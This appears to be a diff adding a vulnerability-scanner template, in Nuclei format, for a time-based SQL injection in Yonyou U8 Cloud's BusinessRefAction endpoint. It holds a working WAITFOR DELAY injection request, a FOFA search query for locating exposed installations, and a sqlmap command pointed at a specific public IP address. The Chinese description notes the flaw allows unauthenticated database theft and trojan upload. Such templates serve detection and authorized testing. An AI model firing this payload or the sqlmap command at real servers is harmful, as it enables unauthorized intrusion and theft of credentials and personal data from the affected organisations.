@@ -1,0 +1,32 @@
+id: yonyou-u8-cloud-BusinessRefAction-sqli
+
+info:
+  name: 用友 U8 Cloud com.ufida.web.action.ActionServlet - sqli
+  author: leadlife
+  severity: high
+  description: 用友U8 Cloud BusinessRefAction接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference: 
+    - https://github.com/wy876/POC/blob/13fda87f0d865d7de818858de3e7d2d69d787e14/%E7%94%A8%E5%8F%8BU8-Cloud%E7%B3%BB%E7%BB%9FBusinessRefAction%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: app="用友-U8-Cloud" || title=="U8C"
+    sqlmap: sqlmap -u "http://106.14.224.133:8888/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.ExportUfoFormatAction&method&repID=1" --batch
+  tags: yonyou,sqli,oa,time,u8cloud
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:6%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 200
+        condition: and
